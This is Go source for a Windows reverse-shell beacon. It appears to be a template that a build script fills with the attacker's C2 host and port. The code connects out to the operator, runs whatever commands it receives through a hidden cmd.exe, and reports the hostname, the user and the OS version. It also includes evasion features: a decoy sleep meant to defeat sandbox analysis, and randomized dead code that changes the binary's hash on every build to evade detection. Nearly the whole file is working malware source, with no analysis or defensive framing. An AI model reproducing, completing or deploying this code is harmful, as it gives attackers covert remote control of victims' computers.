//go:build windows
// +build windows

// {{RANDOM_COMMENT_1}}
// {{RANDOM_COMMENT_2}}

package main

import (
	// {{RANDOM_IMPORT}}
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ============================================================
// PLACEHOLDERS — replaced by generate.py at build time
// ============================================================
var c2Host = "{{C2_HOST}}"
var c2Port = "{{C2_PORT}}"

// Randomized per-build — changes binary hash every compile
var buildMarker = "{{BUILD_MARKER}}"

// ============================================================
// GLOBAL LOGGER
// ============================================================
var logWriter io.Writer

func initLog() {
	logPath := filepath.Join(os.TempDir(),
		fmt.Sprintf("ps_beacon_%s.log", time.Now().Format("20060102_150405")))

	f, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return
	}
	logWriter = f
	logf("[INIT] Log started — PID=%d, EXE=%s", os.Getpid(), os.Args[0])
}

func logf(format string, args ...any) {
	msg := fmt.Sprintf("[%s] %s\n",
		time.Now().Format("15:04:05.000"),
		fmt.Sprintf(format, args...))

	if logWriter != nil {
		logWriter.Write([]byte(msg))
	}
}

// ============================================================
// WINDOWS API LAZY LOADING
// ============================================================
var (
	kernel32   = syscall.NewLazyDLL("kernel32.dll")
	user32     = syscall.NewLazyDLL("user32.dll")
	advapi32   = syscall.NewLazyDLL("advapi32.dll")
	secur32    = syscall.NewLazyDLL("secur32.dll")

	// Decoy APIs
	procGetTickCount     = kernel32.NewProc("GetTickCount")
	procGetCurrentProcId = kernel32.NewProc("GetCurrentProcessId")
	procGetSystemMetrics = user32.NewProc("GetSystemMetrics")
	procGetCursorPos     = user32.NewProc("GetCursorPos")

	// Username
	procGetUserNameExW = secur32.NewProc("GetUserNameExW")

	// Registry for OS version
	procRegOpenKeyExW   = advapi32.NewProc("RegOpenKeyExW")
	procRegQueryValueExW = advapi32.NewProc("RegQueryValueExW")
	procRegCloseKey      = advapi32.NewProc("RegCloseKey")
)

const (
	NameSamCompatible = 2
	HKEY_LOCAL_MACHINE = 0x80000002
	KEY_READ           = 0x20019
)

// ============================================================
// ENTRY POINT
// ============================================================
func main() {
	initLog()
	logf("[MAIN] Beacon starting — target %s:%s", c2Host, c2Port)
	logf("[MAIN] Go version: %s, OS: %s, Arch: %s", runtime.Version(), runtime.GOOS, runtime.GOARCH)

	// Signal handler — catch unexpected exits
	defer func() {
		if r := recover(); r != nil {
			logf("[PANIC] %v", r)
		}
		logf("[EXIT] Beacon process terminating")
	}()

	// Phase 1: 3-5 min random delay with decoy activity
	decoySleep()

	// Phase 2: C2 loop with auto-reconnect
	reconnectDelay := 30 * time.Second
	for {
		addr := net.JoinHostPort(c2Host, c2Port)
		logf("[CONNECT] Dialing %s ...", addr)

		conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
		if err != nil {
			logf("[CONNECT] FAILED: %v — retry in %v", err, reconnectDelay)
			time.Sleep(reconnectDelay)
			continue
		}

		logf("[CONNECT] TCP established to %s", conn.RemoteAddr())
		c2Loop(conn)
		conn.Close()
		logf("[CONNECT] Disconnected — reconnecting in %v", reconnectDelay)
		time.Sleep(reconnectDelay)
	}
}

// ============================================================
// DECOY PHASE
// ============================================================
func decoySleep() {
	delay := 180 + rand.Intn(121) // 180-300 seconds
	logf("[SLEEP] Starting decoy sleep for %d seconds", delay)

	endTime := time.Now().Add(time.Duration(delay) * time.Second)
	interval := time.Duration(5+rand.Intn(10)) * time.Second
	ticks := 0

	for time.Now().Before(endTime) {
		callHarmlessAPIs()
		ticks++
		time.Sleep(interval)
	}

	logf("[SLEEP] Decoy sleep complete — %d API call cycles", ticks)
}

func callHarmlessAPIs() {
	procGetTickCount.Call()
	procGetCurrentProcId.Call()
	procGetSystemMetrics.Call(0)  // SM_CXSCREEN
	procGetSystemMetrics.Call(1)  // SM_CYSCREEN
	procGetSystemMetrics.Call(67) // SM_SHOWSOUNDS
	var pt struct{ X, Y int32 }
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&pt)))
}

// ============================================================
// C2 COMMAND LOOP
// ============================================================
func c2Loop(conn net.Conn) {
	logf("[C2LOOP] Entering command loop — remote=%s", conn.RemoteAddr())

	buf := make([]byte, 65536)
	cmdCount := 0

	for {
		conn.SetReadDeadline(time.Now().Add(300 * time.Second))

		n, err := conn.Read(buf)
		if err != nil {
			logf("[C2LOOP] Read error: %v — exiting loop", err)
			return
		}

		cmd := strings.TrimRight(string(buf[:n]), "\r\n")
		if cmd == "" {
			continue
		}

		cmdCount++
		logf("[C2LOOP] CMD#%d received: %q", cmdCount, truncate(cmd, 100))

		// ── Command dispatch ─────────────────────────
		var output string
		switch {
		case cmd == "echo alive":
			output = "alive"
			logf("[CMD] echo alive → handled natively")
		case cmd == "hostname":
			output = getHostname()
			logf("[CMD] hostname → %s", truncate(output, 60))
		case cmd == "whoami":
			output = getWhoami()
			logf("[CMD] whoami → %s", truncate(output, 60))
		case strings.Contains(cmd, "OSVersion") ||
			strings.Contains(cmd, "VersionString"):
			output = getOSVersion()
			logf("[CMD] OSVersion → %s", truncate(output, 60))
		case strings.Contains(cmd, "Environment"):
			// PS-specific: [System.Environment]::OSVersion.VersionString
			output = getOSVersion()
			logf("[CMD] PS/Env query → handled natively")
		default:
			// Operator command — spawn cmd.exe (only when needed)
			logf("[CMD] Spawning cmd.exe for: %q", truncate(cmd, 100))
			output = execCmd(cmd)
		}

		// Send output with PS> terminator (C2 protocol)
		resp := output + "\nPS> "
		conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
		_, werr := conn.Write([]byte(resp))
		if werr != nil {
			logf("[C2LOOP] Write error: %v", werr)
			return
		}
	}
}

// ============================================================
// NATIVE COMMAND HANDLERS (no cmd.exe spawn)
// ============================================================

func getHostname() string {
	name, err := os.Hostname()
	if err != nil {
		return fmt.Sprintf("[hostname error: %v]", err)
	}
	return name
}

func getWhoami() string {
	// Try os/user first (reads process token, no subprocess)
	u, err := user.Current()
	if err == nil && u.Username != "" {
		return u.Username
	}
	// Fallback: GetUserNameExW API
	return getUserNameEx()
}

func getUserNameEx() string {
	buf := make([]uint16, 256)
	n := uint32(len(buf))

	ret, _, _ := procGetUserNameExW.Call(
		uintptr(NameSamCompatible),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&n)),
	)
	if ret == 0 {
		return "[username error]"
	}
	return syscall.UTF16ToString(buf[:n])
}

func getOSVersion() string {
	// Read ProductName from registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
	key := syscall.StringToUTF16Ptr(
		`SOFTWARE\Microsoft\Windows NT\CurrentVersion`)
	val := syscall.StringToUTF16Ptr("ProductName")

	var hKey syscall.Handle
	ret, _, _ := procRegOpenKeyExW.Call(
		uintptr(HKEY_LOCAL_MACHINE),
		uintptr(unsafe.Pointer(key)),
		0,
		uintptr(KEY_READ),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret != 0 {
		// Fallback: just return Go's OS info
		return runtime.GOOS + " " + runtime.GOARCH
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	buf := make([]uint16, 256)
	bufLen := uint32(len(buf) * 2) // bytes
	ret, _, _ = procRegQueryValueExW.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(val)),
		0, 0,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bufLen)),
	)
	if ret != 0 {
		return runtime.GOOS + " " + runtime.GOARCH
	}
	return syscall.UTF16ToString(buf)
}

// ============================================================
// SHELL COMMAND EXECUTION (cmd.exe — only for operator commands)
// ============================================================
func execCmd(command string) string {
	c := exec.Command("cmd.exe", "/c", command)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	out, err := c.CombinedOutput()
	result := strings.TrimRight(string(out), "\r\n")

	if err != nil {
		if result != "" {
			result += "\n"
		}
		result += fmt.Sprintf("[err: %v]", err)
	}

	return result
}

// ============================================================
// HELPERS
// ============================================================
func truncate(s string, maxLen int) string {
	s = strings.ReplaceAll(s, "\n", "\\n")
	s = strings.ReplaceAll(s, "\r", "\\r")
	if len(s) > maxLen {
		return s[:maxLen] + "..."
	}
	return s
}

// ============================================================
// RANDOMIZED DEAD CODE — unique per build (generated by generate.py)
// These are compiled in but never called. They change the binary
// fingerprint without affecting behavior.
// ============================================================

type {{RANDOM_TYPE_1}} struct {
	a uint32
	b [{{RANDOM_ARRAY_SIZE}}]byte
	s string
}

type {{RANDOM_TYPE_2}} struct {
	version uint64
	hash    [32]byte
	data    []{{RANDOM_TYPE_1}}
}

func {{RANDOM_FUNC_1}}(input string) string {
	h := sha256.Sum256([]byte(input + buildMarker))
	return hex.EncodeToString(h[:8])
}

func {{RANDOM_FUNC_2}}(j int) uint32 {
	v := uint32(j) ^ 0x{{RANDOM_XOR}}
	for i := 0; i < {{RANDOM_LOOP}}; i++ {
		v = v*1103515245 + 12345
	}
	return v
}

var {{RANDOM_VAR_1}} = {{RANDOM_FUNC_1}}(buildMarker)
var {{RANDOM_VAR_2}} = {{RANDOM_FUNC_2}}({{RANDOM_SEED}})

func {{RANDOM_FUNC_3}}(t {{RANDOM_TYPE_2}}) []byte {
	t.version = uint64(time.Now().UnixNano())
	buf := make([]byte, {{RANDOM_BUF_SIZE}})
	for i := range buf {
		buf[i] = byte(t.hash[i%32] ^ uint8(i))
	}
	return buf
}
